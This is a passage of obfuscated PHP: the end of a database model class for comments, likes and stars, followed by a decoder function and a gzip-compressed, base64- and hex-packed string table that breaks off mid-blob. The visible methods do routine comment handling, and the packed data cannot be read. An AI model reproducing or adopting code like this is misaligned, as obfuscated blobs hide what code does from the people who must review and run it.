$_SERVER[ùÆÎÔ“Ñ]; $ÃŸ’Ù¸ = $†àü–ö„ + self::TYPE_STAR_OFFSET; $–×¨æˆ = $this->commentCount($ş¸¢ˆÃæ, $ÃŸ’Ù¸); $°§‚ïŒ = $this->commentCount($ş¸¢ˆÃæ, $ÃŸ’Ù¸, USER_ID); return array($Ü£´Øİ¦[1891] => $–×¨æˆ, $Ü£´Øİ¦[1892] => $°§‚ïŒ); } public function starTargetUserList($¾ˆä‡µÜ, $ˆï›ÉÒ) { $ö«ùÅ’‡ =& $_SERVER[ùÆÎÔ“Ñ]; $»·æœÈã = $¾ˆä‡µÜ + self::TYPE_STAR_OFFSET; $ÄûØ…†Û = array($ö«ùÅ’‡[505] => $ˆï›ÉÒ, $ö«ùÅ’‡[411] => $»·æœÈã); $èãæ€Ì¬ = $this->where($ÄûØ…†Û)->count(); $Ã¼¶ã˜˜ = array($ö«ùÅ’‡[255] => $èãæ€Ì¬, $ö«ùÅ’‡[1893] => array()); if (!$èãæ€Ì¬) { return $Ã¼¶ã˜˜; } $Öèö…¨Î = $this->field($ö«ùÅ’‡[1667])->where($ÄûØ…†Û)->limit(500)->select(); $Öèö…¨Î = array_to_keyvalue($Öèö…¨Î, $ö«ùÅ’‡[12], $ö«ùÅ’‡[1667]); $Ã¼¶ã˜˜[$ö«ùÅ’‡[1893]] = Model($ö«ùÅ’‡[513])->userListInfo($Öèö…¨Î); return $Ã¼¶ã˜˜; } public function prasiseUserList($Şà¡·´¼) { $ùİ¬¬ôİ =& $_SERVER[ùÆÎÔ“Ñ]; $–éÇ¿†÷ = array($ùİ¬¬ôİ[1894] => $Şà¡·´¼); $€áÚı¤Ş = $this->where($–éÇ¿†÷)->find(); $ÖáÇ¥»İ = _get($€áÚı¤Ş, $ùİ¬¬ôİ[1889], 0); $ã²¹¬ = array($ùİ¬¬ôİ[255] => $ÖáÇ¥»İ, $ùİ¬¬ôİ[1893] => array()); if (!$ÖáÇ¥»İ) { return $ã²¹¬; } $êÎÄ¥Ôš = Model($ùİ¬¬ôİ[1895])->field($ùİ¬¬ôİ[1667])->where($–éÇ¿†÷)->limit(500)->select(); $êÎÄ¥Ôš = array_to_keyvalue($êÎÄ¥Ôš, $ùİ¬¬ôİ[12], $ùİ¬¬ôİ[1667]); $ã²¹¬[$ùİ¬¬ôİ[1893]] = Model($ùİ¬¬ôİ[513])->userListInfo($êÎÄ¥Ôš); return $ã²¹¬; } public function remove($ã›ùêŸõ) { $€ßïÓäÎ =& $_SERVER[ùÆÎÔ“Ñ]; $ß«ÑÎû = array($€ßïÓäÎ[1887] => $ã›ùêŸõ); $çÜğ†•ê = $this->where($ß«ÑÎû)->find(); if ($çÜğ†•ê[$€ßïÓäÎ[1886]]) { $this->where(array($€ßïÓäÎ[1887] => $çÜğ†•ê[$€ßïÓäÎ[1886]]))->setAdd($€ßïÓäÎ[1888], -1); } return $this->where($ß«ÑÎû)->delete(); } public function edit($ìøœïü´, $ş¹¼ïçÏ) { $é°¦ÖÒæ =& $_SERVER[ùÆÎÔ“Ñ]; $ĞùòúñÇ = array($é°¦ÖÒæ[1887] => $ìøœïü´); return $this->where($ĞùòúñÇ)->save(array($é°¦ÖÒæ[1896] => $ş¹¼ïçÏ)); } public function prasise($³úá¡ë) { $ÁÄ³‡Í =& $_SERVER[ùÆÎÔ“Ñ]; $ï²ä¸¶¯ = Model($ÁÄ³‡Í[1897]); $ÚÇ¤À› = array($ÁÄ³‡Í[1887] => $³úá¡ë, $ÁÄ³‡Í[1658] => USER_ID); $ÇÉ‘µÙÊ = $ï²ä¸¶¯->where($ÚÇ¤À›)->find(); if (!$ÇÉ‘µÙÊ) { $ï²ä¸¶¯->add($ÚÇ¤À›); $°½Ìé¸‚ = $this->where(array($ÁÄ³‡Í[1887] => $³úá¡ë))->setAdd($ÁÄ³‡Í[1889], 1); } else { $ï²ä¸¶¯->where($ÚÇ¤À›)->delete(); $°½Ìé¸‚ = $this->where(array($ÁÄ³‡Í[1887] => $³úá¡ë))->setAdd($ÁÄ³‡Í[1889], -1); } return $°½Ìé¸‚; } public function targetInfo($ “ÂúòÆ, $·­Öæã) { $‡¤Ôõ×· =& $_SERVER[ùÆÎÔ“Ñ]; $¢­ç£ï = array($‡¤Ôõ×·[586] => $ “ÂúòÆ, $‡¤Ôõ×·[587] => $·­Öæã); $ê’¡·Ûæ = $this->where($¢­ç£ï)->count(); $×Á©¿‡Ä = "\122\x49\x47\110\x54\x20\112\117\111\116\x20{$this->tablePrefix}\x63\x6f\x6d\x6d\145\x6e\x74\137\x70\162\x61\x69\163\x65\x20\163\x74\141\x72\40\x6f\x6e\x20\143\157\155\x6d\145\156\x74\56\143\x6f\x6d\x6d\x65\156\164\x49\104\40\x3d\x20\163\x74\141\162\56\x63\x6f\x6d\155\x65\156\x74\x49\x44"; $ÒÕ›ò°¯ = $this->alias($‡¤Ôõ×·[354])->where($¢­ç£ï)->join($×Á©¿‡Ä, $‡¤Ôõ×·[1898])->count(); $£şêó½Ğ = array($‡¤Ôõ×·[1899] => $ê’¡·Ûæ, $‡¤Ôõ×·[1900] => $ÒÕ›ò°¯); return $£şêó½Ğ; } public function listData($Öè™”Ö) { $Ç³‰‹£— =& $_SERVER[ùÆÎÔ“Ñ]; if (isset($Öè™”Ö[$Ç³‰‹£—[1901]])) { if ($Öè™”Ö[$Ç³‰‹£—[1901]]) { $Öè™”Ö[$Ç³‰‹£—[1894]] = array($Ç³‰‹£—[1019], intval($Öè™”Ö[$Ç³‰‹£—[1901]])); } unset($Öè™”Ö[$Ç³‰‹£—[1901]]); } if (isset($Öè™”Ö[$Ç³‰‹£—[1902]])) { if ($Öè™”Ö[$Ç³‰‹£—[1902]]) { $Öè™”Ö[$Ç³‰‹£—[1894]] = array($Ç³‰‹£—[1016], intval($Öè™”Ö[$Ç³‰‹£—[1902]])); } unset($Öè™”Ö[$Ç³‰‹£—[1902]]); } return $this->_listData($Öè™”Ö); } private function _listData($çÅĞ¨ñ) { $£Ş”¼© =& $_SERVER[ùÆÎÔ“Ñ]; $²ùßÈùÕ = $this->where($çÅĞ¨ñ)->_makeOrder()->selectPage(100); $this->_listAppendParent($²ùßÈùÕ[$£Ş”¼©[369]]); $this->_listAppendUser($²ùßÈùÕ[$£Ş”¼©[369]]); $this->_listAppendMeta($²ùßÈùÕ[$£Ş”¼©[369]]); return $²ùßÈùÕ; } private function _makeOrder() { $øñ’¨¥ =& $_SERVER[ùÆÎÔ“Ñ]; $­ï€ÔÈ· = array($øñ’¨¥[1889], $øñ’¨¥[1888], $øñ’¨¥[200]); $Œ“Â§‹ø = Input::get($øñ’¨¥[457], $øñ’¨¥[7], $øñ’¨¥[423], $­ï€ÔÈ·); $°Ø¨Ø€Å = Input::get($øñ’¨¥[458], $øñ’¨¥[7], $øñ’¨¥[1660], array($øñ’¨¥[1903], $øñ’¨¥[453])); $Ş¾şŸÃ« = $Œ“Â§‹ø . $øñ’¨¥[53] . $°Ø¨Ø€Å; return $this->order($Ş¾şŸÃ«); } private function _listAppendParent(&$ØØÔµ™¹) { $Œ‰øÍî =& $_SERVER[ùÆÎÔ“Ñ]; $è½œƒ’ = array_unique(array_to_keyvalue($ØØÔµ™¹, $Œ‰øÍî[12], $Œ‰øÍî[1886])); $è½œƒ’ = array_remove_value($è½œƒ’, $Œ‰øÍî[197]); if (!$è½œƒ’) { return; } $·ïÙü‚¤ = $this->where(array($Œ‰øÍî[1887] => array($Œ‰øÍî[7], $è½œƒ’)))->select(); $·ïÙü‚¤ = array_to_keyvalue($·ïÙü‚¤, $Œ‰øÍî[1894]); foreach ($ØØÔµ™¹ as &$íê£«ÔÊ) { if (isset($·ïÙü‚¤[$íê£«ÔÊ[$Œ‰øÍî[1886]]])) { $íê£«ÔÊ[$Œ‰øÍî[1904]] = $·ïÙü‚¤[$íê£«ÔÊ[$Œ‰øÍî[1886]]]; } } unset($íê£«ÔÊ); } private function _listAppendUser(&$ØÒ„ÕÀË) { $ûàŸº =& $_SERVER[ùÆÎÔ“Ñ]; $ó‚İ«é = array_unique(array_to_keyvalue($ØÒ„ÕÀË, $ûàŸº[12], $ûàŸº[1667])); $ó‚İ«é = array_remove_value($ó‚İ«é, $ûàŸº[197]); if (count($ó‚İ«é) == 0) { return; } foreach ($ØÒ„ÕÀË as $¯·íÄô“) { if (isset($¯·íÄô“[$ûàŸº[1904]])) { $ó‚İ«é[] = $¯·íÄô“[$ûàŸº[1904]][$ûàŸº[1667]]; } } $ÔÌâ›æñ = Model($ûàŸº[535])->userListInfo($ó‚İ«é); foreach ($ØÒ„ÕÀË as &$¯·íÄô“) { $¯·íÄô“[$ûàŸº[600]] = $ÔÌâ›æñ[$¯·íÄô“[$ûàŸº[1667]]]; if (isset($¯·íÄô“[$ûàŸº[1904]])) { $¯·íÄô“[$ûàŸº[1904]][$ûàŸº[600]] = $ÔÌâ›æñ[$¯·íÄô“[$ûàŸº[1904]][$ûàŸº[1667]]]; } } unset($¯·íÄô“); } private function _listAppendMeta(&$ªÑ’·†É) { $šà¾èŸ =& $_SERVER[ùÆÎÔ“Ñ]; $½ß¯ Ğ = array_unique(array_to_keyvalue($ªÑ’·†É, $šà¾èŸ[12], $šà¾èŸ[1894])); $½ß¯ Ğ = array_remove_value($½ß¯ Ğ, $šà¾èŸ[197]); if (!$½ß¯ Ğ) { return; } foreach ($ªÑ’·†É as $õ¥Áß÷ú) { if (isset($õ¥Áß÷ú[$šà¾èŸ[1904]])) { $½ß¯ Ğ[] = $õ¥Áß÷ú[$šà¾èŸ[1904]][$šà¾èŸ[1894]]; } } $Ï¬‚•ç¤ = $this->metaList($½ß¯ Ğ); if (!$Ï¬‚•ç¤) { return !1; } foreach ($ªÑ’·†É as &$õ¥Áß÷ú) { $õ¥Áß÷ú[$šà¾èŸ[466]] = $Ï¬‚•ç¤[$õ¥Áß÷ú[$šà¾èŸ[1894]]]; if (isset($õ¥Áß÷ú[$šà¾èŸ[1904]])) { $õ¥Áß÷ú[$šà¾èŸ[1904]][$šà¾èŸ[466]] = $Ï¬‚•ç¤[$õ¥Áß÷ú[$šà¾èŸ[1904]][$šà¾èŸ[1894]]]; } } unset($õ¥Áß÷ú); } private function metaList($ü­—•‘ü) { $Â¢Õéíı =& $_SERVER[ùÆÎÔ“Ñ]; if (!$ü­—•‘ü) { return array(); } $ĞÌ£”ÜÃ = array($Â¢Õéíı[1894] => array($Â¢Õéíı[7], $ü­—•‘ü)); $„ªÌÑ¡ = Model($Â¢Õéíı[1905])->where($ĞÌ£”ÜÃ)->select(); $„ªÌÑ¡ = array_to_keyvalue_group($„ªÌÑ¡, $Â¢Õéíı[1894]); foreach ($„ªÌÑ¡ as $Æ‹îéˆŒ => $îš¦­ƒ) { $Äƒù¦êÍ = array(); foreach ($îš¦­ƒ as $™¶Â¸ì„) { $Äƒù¦êÍ[$™¶Â¸ì„[$Â¢Õéíı[94]]] = $™¶Â¸ì„[$Â¢Õéíı[374]]; } $„ªÌÑ¡[$Æ‹îéˆŒ] = $Äƒù¦êÍ; } return $„ªÌÑ¡ ? $„ªÌÑ¡ : array(); } } goto a¨ÌñßÉ¡§; eÜ…ò—Á¤: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\xf9\xc6\xce\xd4\x93\xd1", "\371\370\320\345\304\370"); $_SERVER[ùÆÎÔ“Ñ] = explode("\x7c\x3\x7c\x3\x7c\x1", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\11\170\33\325\325\150\41\264\354\113\201\37\132\12\145\60\44\266\143\55\166\166\234\70\101\266\145\133\211\154\71\222\234\304\330\316"."\144\44\215\255\211\45\215\74\63\362\26\207\102\113\330\302\122\312\122\266\2\205\262\157\201\226\245\204\65\245\320\226\245\100\313\126\226\237\102\22\2\24\50\153\313\243\245\357".base64_decode('LucuM1Lgf9973/cCie4+dzn33HPOPefck/9y1T1/vmlqGvpvl9ef+uH1F51Jw+i/')."\135\247\166\243\341\43\67\356\361\15\362\347\240\215\147\324\324\164\314\333\253\256\153\237\163\176\165\213\166\263\166\243\166\172\54\372\370\23\221\175\237\272\171\151\170\373\325\217"."\x4f\x6c\xdf\xe5\x1b\x5f\xde\xfe\xf8\x9b\x8d\xa8\x30\xad\xdb\x48\x7f\x94\x82\xe9\x28\xfa\xb8\x61\x3b\x36\x4d\x48\x9b\x85\x41\x63\x88\x86\x8d\x2\xfd\xd\xd2\x9f\x9e\x78\xd4\xd2\xf3\xa6\xa3\xd3"."\x68\x80\xfe\xa8\xd0\x2f\xf2\xaf\x3d\x92\x33\x58\xbe\xda\x15\x4b\xaa\x89\x9e\xee\xee\x70\x3c\x9\x85\x1a\xe5\xfc\xbc\x99\x81\x50\x51\xb3\xb4\x3c\x7c\xbf\xa8\x5b\x36\xea\x8d\xdc\x9c\x5a\x34\x8b"."\x7a\xc1\x95\x22\x12\x32\x9a\xa3\xa5\x34\x1b\x5a\x6a\x6d\x56\x5b\xc3\xdd\xd1\x58\xaf\x9a\xec\xed\xe\x43\x89\x94\x3a\x52\xd2\xad\x9\x1a\x23\xc1\x84\xa3\x59\x4e\xd2\xc8\xeb\xbc\xc4\x98\xc5\xfb"."\xd5\x1c\x6e\x8f\x74\x29\xc9\x78\xa8\x2b\x11\x6a\x49\x46\x62\x5d\x34\xb9\x25\xd6\xd9\x19\x49\x96\xa7\xc7\x63\xd1\x68\x73\xa8\x65\x59\x79\x4e\x77\x3c\xd4\xde\x19\x52\x50\xff\x72\xba\x6a\x14\x6".base64_decode('zRplDc1Zo9TSQJuh5zI0WNBYd5yJIoSSPISWqVDK5Wiki4cy+qBWysFstcqRomXk')."\x35\x36\xe8\x65\xfa\x4\x4f\xa5\x1\xad\xe4\x98\x46\x21\x4d\x23\xe1\x71\xc7\xd2\x44\x3a\xea\x6b\x1a\x2d\xb4\x5e\x80\xa6\x12\xe1\x68\xb8\x25\xa9\xe0\xe\x2a\x6d\xf1\x58\xa7\x2\x8b\x90\xd7\x6c"."\x47\xb7\x94\x95\x1d\xe1\x78\x58\xc1\x9d\x6e\xaa\x26\x63\xad\x56\x0\x5e\xba\xd0\x54\x28\xa1\x68\x54\xd9\x59\xb\x8e\x9e\x2f\xb2\x66\x68\x9d\xa\x8d\xc5\xe2\xad\xe1\xb8\xd2\xdc\xab\x88\x19\x4a"."\x9b\xf9\xbc\x59\x8\xa0\x56\xd0\x4a\x3a\x52\x57\xc3\xf1\x38\xd\xf8\x0\xbc\xa3\x11\xbc\x68\x10\x89\xb5\xb5\x25\xc2\x3c\x6\x83\x5b\x1e\x45\x3d\x99\xd\xf0\xe9\x8a\x65\x6\x73\x8e\x3a\xaa\xe5"."\112\14\114\207\351\157\65\374\300\257\151\3\350\216\30\5\243\4\140\12\115\230\46\337\126\20\50\261\322\72\113\321\63\20\310\243\372\46\354\74\264\15\107\151\260\151\61\375"."\x5d\x8\x85\x52\x2a\xce\xd3\x2d\x47\xd5\xb\x69\x33\x63\x14\x60\xb3\x2e\x1\xa0\xd3\x9c\x6c\xab\x65\xa0\x2\x34\x3e\x68\xe6\x32\x2c\x6c\x1b\x93\x30\x94\x41\x23\xa7\x77\x95\xf2\x72\x11\x1e\x4d"."\x67\x8d\x5c\xc6\x62\xfb\xeb\xab\x4a\xd2\x68\x94\x6f\x57\x5c\x56\xc4\x8a\xa8\x27\x53\x6c\xa7\x1b\x83\x13\x62\xbf\xd9\x66\xc9\x4a\xeb\x11\xb4\x23\x44\xbd\x6e\x5e\xba\x1\xa\xe9\x8e\x83\x6\x7".strrev('wÓX,f‘‘}³d*z0®Ñ÷À3­ò´Í¬R%‰Èä¬b¨m˜f‡Åºe©œÅ=˜cs').base64_decode('kv/Lgb7j0D+1gPr6oU9ZPZdT9XEdNk4+M9dmkxG0U0YhiFJoNBJTs5qd7czMVUkt')."\350\162\41\243\217\7\212\331\42\215\212\55\335\357\2\154\74\165\135\246\23\226\360\162\316\114\153\71\171\210\64\234\165\234\142\102\57\144\360\114\300\120\314\261\2\231\251\242"."\256\103\241\126\237\222\121\72\225\136\245\243\321\150\264\131\305\174\216\207\330\350\170\232\315\23\235\161\266\234\231\101\32\110\261\143\241\12\76\150\330\4\303\211\355\251\25\213"."\x39\x23\xad\x39\x86\x59\x8\x9a\x69\x47\x77\xfc\xb6\x63\xe9\x1a\xb4\x18\x4a\xa7\x75\xdb\xf6\xb7\x98\x5\xc7\x32\x73\xfe\x50\x2e\x67\x8e\xf9\x63\x96\x31\x64\x14\x1a\x95\x99\xb4\xc\xce\x44\x9b"."\xda\x8f\x11\x60\x23\xec\xd4\xaa\x85\xa\x6\x14\xfc\x99\x99\x4d\x25\x67\xd0\xbf\x80\xed\x40\x5e\xda\xd2\xa\xf6\xa0\x6e\xf9\xc3\xb0\x33\x1a\x15\xd4\x59\x8e\x5\x59\xb1\x56\xc3\x2e\x9a\xb6\x81".base64_decode('u9eoaI6jpbMYg4jmm76ivFHIGQW9rGx4vGhYus36qrR3JqER1Lru77a0obzWqBRL')."\51\64\63\260\123\53\244\321\322\60\65\215\112\32\107\175\112\276\144\73\176\113\107\250\310\100\307\35\114\162\144\320\337\211\367\225\241\147\374\11\204\261\41\171\166\375\34\5"."\x81\x8e\xc2\xf2\x68\x6a\x47\x32\xd9\xad\x46\xda\xd0\x91\xdc\x15\x56\x3b\x43\xc9\x96\xe\xe8\xb6\xa3\xd\xb1\x3e\x47\x11\x1e\xe6\x4d\xb2\xc4\x55\x7e\xb4\xbf\x30\x70\x75\xa1\xb1\x8a\xc4\x6e\x73"."\114\267\320\207\233\47\32\225\141\63\223\62\307\3\54\13\27\116\40\104\303\12\343\345\56\72\376\270\126\30\302\363\223\232\160\164\0\101\173\164\310\75\321\121\275\60\344\144"."\x59\xc5\x44\x38\xbe\x22\x1c\x57\x13\xb1\xb6\xe4\xca\x50\x1c\xe\xf3\x2\x82\x92\x71\xf6\x29\xdc\x74\xce\x1f\xd7\x33\x68\xea\xd3\xe\xab\xa7\x15\xf1\xac\xb1\x32\x78\x73\xe0\xb5\x62\xb9\x78\xc3"."\260\274\150\244\35\117\114\253\337\106\205\374\162\51\326\166\324\310\33\270\357\16\317\41\63\211\116\372\166\350\120\220\14\250\251\77\73\263\246\77\123\127\353\107\377\316\254\355".strrev('í´—gÁÉŠÿAfš-=Ì¶%z‰Ytå¡‡¤FéO?U™A C`D4XÌ'."\r".'oë')."\75\323\112\23\343\341\345\75\341\104\122\355\14\47\73\142\255\360\365\160\10\102\121\223\156\133\66\332\76\372\63\0\253\73\100\177\124\303\156\223\216\25\34\345\350\107\65\123".base64_decode('a9FidOoMxw5SHB3Ja0MelI9jnaalu1Om+FG10siwMwFHO3RjKAvzZeDW0mbOtLQc')."\xc6\x8c\x6c\x53\xe8\xc\x5b\xd\x19\x80\xad\x0\x9\x8b\x48\xc2\xc8\x17\x59\x67\x9d\x6c\x29\x9f\x92\x82\x80\xed\x6d\x4\x3f\xc\x97\x65\x4d\x7e\x9e\x99\x16\x84\x1a\x83\x50\x70\xfa\xac\x36\xd8"."\x8c\xb1\x60\x62\x36\xfa\x5f\xa0\xf6\x8c\x99\xd7\x18\xa2\x24\x28\x4e\xcf\x50\x1c\x47\x93\x66\xba\x72\x3a\x74\x4d\x1c\xd2\x8e\xe5\x98\x38\xd5\x72\x15\x41\x13\x9a\x35\x61\x61\x87\x74\xd6\xa5\x12".base64_decode('7xvrZUbP6Ww2sjo7JuqhGDrm+FwN8jVD1B5KFeezYcdRTYzUWXwlJo9FgsOL5tAJ').base64_decode('FSMrLuLdlj5owCYtoBXp1KxhNhq0AgJWcESCo7aeaFRtiXUlEUlNU1bGI8kwg9tQ')."\xab\x1a\x6a\xe9\x9e\x62\x7\xaf\x58\x51\x28\x80\x11\x8c\x1b\xf0\x5\xf9\x3c\x3a\xb\x3a\x8e\xba\x13\x14\xc7\x1c\xc2\xd8\x45\xb3\x60\xeb\xfe\x34\xd4\x10\xa4\x77\x59\x56\x46\x9c\x2\xb4\x84\x74"."\162\170\16\203\161\277\226\237\364\347\321\26\360\363\216\272\317\140\5\116\7\172\224\107\140\225\4\162\307\323\210\270\42\166\370\167\307\22\120\141\11\116\105\4\130\112\267\340"."\x63\xdd\x3d\x90\x95\x97\x20\xa4\x3d\xc\x89\x7b\x1\x50\x65\x35\x20\xab\x42\x2b\x13\xc\x31\x97\x50\x79\xcb\x98\xd4\xc4\x90\x96\xb0\xfe\xb0\x81\xe4\x73\x82\x9e\x73\x8f\xca\x2f\x66\x3e\xd9\x11"."\351\132\246\166\306\132\303\121\65\322\205\60\123\262\74\275\247\273\65\304\226\122\116\157\216\45\73\134\251\75\10\67\255\10\105\43\336\342\341\125\221\104\62\121\61\13\245\365".strrev('6S™Š:à›$"¯.è;1Yˆ:ˆ„êÓ(‡KP–Ô&¶-´x«"Û‡ìˆ9=„')."\x59\xaa\x8b\x87\x52\x19\x77\xa0\xa\x18\x42\x87\xa9\xe\x90\x6\xc3\xc5\x2c\x31\x19\x9\x30\xc4\x69\xb3\xc4\x8e\x0\x4e\x48\xe6\x19\x8e\xc8\x6b\xb0\x89\x34\x76\x50\xd6\xd0\x9f\x5a\x25\x94\x50"."\234\42\264\201\260\101\152\202\7\311\60\130\34\221\214\360\175\5\20\176\131\17\124\134\246\131\37\344\170\270\162\102\150\320\341\350\336\23\107\300\57\362\320\12\204\10\357\215"."\40\201\254\10\174\306\100\133\311\162\102\254\73\203\202\357\125\143\335\341\170\10\163\315\352\312\170\254\253\35\52\214\145\165\326\201\10\114\177\15\43\256\200\171\166\4\102\102"."\x94\x91\x6\x7b\x25\x2f\x26\x7d\xad\xc9\xa6\x72\x8a\xfe\xcc\xa0\x3f\x88\x28\x84\x8f\xeb\x5\x36\xeb\x29\x8c\x9b\xd9\xe9\xc2\x2\x83\x68\x37\x30\xbc\x6a\x96\xf8\xd7\x52\xa6\x9\x5f\xc8\x61\xfa"."\x60\x8a\x21\xc\xce\x7c\xaf\xb5\x19\x90\x8c\x33\x54\x53\x7\x1f\x1c\x87\xf3\x21\x19\x5b\x16\xee\x52\x19\x64\xd1\x98\x4\x8d\x34\x1\xb1\xb3\xb1\x38\x4c\x88\x63\xe\x33\x9e\x8c\x66\xc6\xc3\x9"."\xb6\xcb\x2d\x7d\xa4\x64\xb0\xe9\xa\x6\xea\x0\x8a\x75\x74\x4\xc1\xe7\x83\xab\xfb\xc7\xea\x6a\xfa\xfc\x75\x81\x1\x14\xa8\x9d\x79\x1c\x8d\x42\xac\x3f\xe0\x8a\x1e\x3\xf5\x4b\x16\xaf\x8d\xc9".base64_decode('php7SW1jf7A/WLOksS/kn9T8k/X+Y/0Ddf2B2jpIGFg3yzdnPS6ACi45egD9NPUv').base64_decode('md7vn3HCmuP6+geqG+uO6g8c3T82MLN2CftOumQhfjM9wbuaqatBXULkFC9SIChP').strrev('>ï¼UxÈñãşBåå›ü!.D-ûÉ)=R%ºşş}‰¨kGK=o7]H¢&2À*')."\112\205\264\300\236\170\137\244\264\64\340\1\143\250\300\267\20\72\323\71\237\356\246\342\327\115\247\277\353\331\102\16\351\260\351\211\40\316\2\350\54\25\214\21\46\206\50\350"."\43\20\60\35\6\337\51\335\31\323\31\170\240\164\127\34\1\7\143\35\121\226\24\313\21\302\20\276\200\31\52\16\243\34\230\214\242\212\51\254\61\36\313\350\5\130\247\75"."\241\264\235\326\212\172\102\32\241\252\46\103\315\321\260\312\60\14\140\142\26\47\130\261\231\213\354\320\320\4\106\145\370\41\55\110\170\302\255\300\316\267\107\162\12\101\14\212"."\156\131\246\325\110\244\227\166\251\210\111\63\304\231\71\150\156\25\304\323\53\115\213\25\72\345\120\117\225\27\240\250\61\72\1\163\333\272\330\364\30\103\101\237\212\142\205\154"."\x44\x50\x31\xea\x26\x58\xd3\xdf\x5f\xea\xd3\x33\x3\x7d\x8\xf0\x35\xff\xe0\xc0\xba\xd9\xeb\x6b\x19\x95\x1f\xec\x47\x7f\x58\x24\x54\x41\x8e\xa6\x72\x6c\xa8\xa2\xf3\x39\x80\xfb\xc1\x45\x29\xae"."\10\317\246\121\323\342\44\122\321\105\104\73\246\243\345\134\115\44\161\12\54\56\77\270\101\250\100\127\73\52\60\26\76\312\45\1\44\101\247\135\234\211\347\262\21\111\2\206"."\x6b\x24\x74\x27\xc0\x4b\xf8\xa4\x4c\x15\xc5\x5d\xc2\xe0\x26\x10\x10\xc\x1a\x5\xb4\x9d\x5a\xa4\xa3\x8e\x8a\x76\x12\x13\xb6\xa3\xe7\x5d\x52\x4b\x5b\xd7\xac\x74\xb6\xad\x94\xcb\x39\x9c\x94\xcf"."\x19\xc3\xf0\x5\xd8\x2b\x20\x44\xf5\xd3\x1f\xa5\xae\x52\xd5\x36\xd3\x62\x1c\xf1\x4c\xe8\x46\xd5\xcc\x4a\x5\x23\x85\x2\xe2\x5f\x65\x50\x13\x87\x6c\x7b\x8\x91\x33\x49\xa5\x86\x9\xfc\x94\x48".base64_decode('l9Ici0XDoS4Fn+dwDiFiIRHuDqFDDPPWiWQYZJCRVj9rd5U/AhwWDxgw7WYRYxAV')."\315\211\212\70\231\141\266\226\10\41\72\254\50\310\313\40\206\11\115\37\226\20\371\60\245\341\103\143\360\141\366\310\47\250\170\237\20\270\371\106\15\175\214\4\70\261\355\3"."\32\334\347\150\26\42\30\60\221\14\301\110\253\317\260\133\11\3\101\76\100\262\130\207\234\54\226\203\344\264\11\37\355\134\124\37\325\163\76\326\65\37\353\261\217\361\206\76"."\xc2\xd0\xb5\x42\xb7\x7a\xd0\xe6\x82\x6e\x91\x20\xc2\xa1\x59\x1f\x6\x27\xc\xcd\x3e\x21\x10\xf4\x99\x63\x5\xdd\x22\x45\x60\x9a\x4\xef\xe1\x13\x7c\x89\x6f\xc8\x32\x4b\xc5\x6e\xf6\x4d\x29\x46".base64_decode('uwUJos88IW6ajo/xmj6ZDYVehNiuqTidlUdD5t/bCVg7nFU+S1+zWOXr4Wa519EW')."\x81\xa7\x5f\xcf\xce\x3c\x57\x19\xb1\xbc\x6c\x1b\xe6\x74\x11\xc3\xb\x20\x42\x2b\xc4\x36\xc6\x3\x6a\xd3\x46\x65\xc8\xab\x4\x85\xec\xe4\x61\x60\x2c\xa4\x7f\x42\xee\x2b\x28\x61\x2f\x87\xe9\x95"."\x8\xe3\x8f\x26\xb5\xa1\x84\xf4\x39\x47\x1b\x62\xdf\xc2\xa8\xc\xe5\xee\xb4\x28\xd\xc7\xf5\xf4\x44\x5a\xb0\xac\xad\x12\x23\xec\x8e\xb9\x37\x57\x9\xb5\x97\xd0\x6\x3d\x83\xf4\x91\x5d\x56\x69"."\x87\x54\x86\x0\xe\xf5\x7c\xc1\xf6\xda\x73\x4f\x36\xe3\x6c\x2b\xf0\xd5\x77\xed\xa0\xaf\xdf\xbb\x30\x4a\x82\x2e\x63\x45\x41\x70\xd0\xce\x62\x94\x9d\x40\x7\x60\x5b\x8e\x4d\xd1\x2c\x39\x1b\x90"."\265\317\35\303\133\57\100\220\67\271\126\111\160\331\106\64\334\226\124\226\306\20\246\63\114\225\326\121\161\141\205\374\143\26\24\127\333\154\272\224\46\222\57\342\132\41\103\123"."\xd6\xa0\x53\x61\x4d\x53\x15\xfb\x48\x95\xab\xba\x0\x1a\x77\x27\x7c\x2c\xea\xfa\x9a\x58\x7f\x79\x12\x30\x70\x90\xe1\x8b\x93\x8c\x25\xc5\xc4\xc1\x59\x2\x2a\x51\xb3\xd3\x34\x80\xc5\xe4\x10\xd2".base64_decode('WZpYWhlKJWQkEli/XN/FUbHDGEgo+APQAKFrMMLxi70iRd1T7oFIz3GLp6jbKEwY').base64_decode('BVmiJVKn+IktCAa81T0yuNadhekRIyRmPpCk+XJGYVg6zIU4B/UeV5X6Di15es6Q')."\56\14\272\47\21\216\253\354\333\260\273\1\342\263\232\45\46\223\341\44\214\30\204\234\20\27\21\121\251\330\240\66\52\210\31\127\35\11\263\330\316\4\353\275\34\164\67\112"."\xa3\xad\x3b\x8b\x74\x70\x41\x48\xa5\xa8\x8c\xa7\xc\x3b\x8a\xe6\xae\x52\x98\x8c\x34\x69\x56\x8c\x62\x61\x1b\xb\x53\x62\xc1\x6\x60\xc2\x8b\x50\xc3\x90\xa\x10\x23\xaa\x24\x52\xe0\x48\xc9\x8d"."\361\150\227\102\374\0\100\307\52\72\24\151\30\321\376\71\164\26\132\1\274\207\332\361\211\306\346\214\242\77\31\46\23\72\332\60\120\117\264\226\50\313\223\113\13\161\22\76"."\34\304\141\302\346\132\154\101\61\377\142\277\271\100\145\110\364\16\343\160\265\274\123\30\334\53\307\333\54\223\123\315\234\110\360\26\152\41\154\51\277\315\364\34\354\322\344\270".strrev('ÊÎS“gZRÜ¢^¯´'."\r".'ÀlÄ}‹'."\n".'7“-h"bM§\\Ub¢z¤ñ,—©$²‘ˆ').base64_decode('9Z5Fd0wTcbBWwEJfFh2SECJgE3JBiQ9Nmd7grdgoQ0LtbrKK1UwUNbYtgD8p8c9w')."\32\220\106\13\106\172\130\154\145\155\124\103\300\10\115\223\301\210\236\322\170\224\223\321\30\323\204\63\206\203\123\360\101\152\62\171\271\50\50\335\112\363\64\31\301\223\163\252"."\x6c\xf1\x5\x4f\xe2\x9b\xee\x2a\xe9\xa6\x34\x20\x71\x26\x21\x0\x2\x82\x30\x92\x2f\xe5\xd3\x66\x11\xe0\x40\xd2\x41\xc9\x9b\xa3\xba\x94\x18\xb0\x1d\xb3\x28\x72\xa4\x28\xcd\x96\xb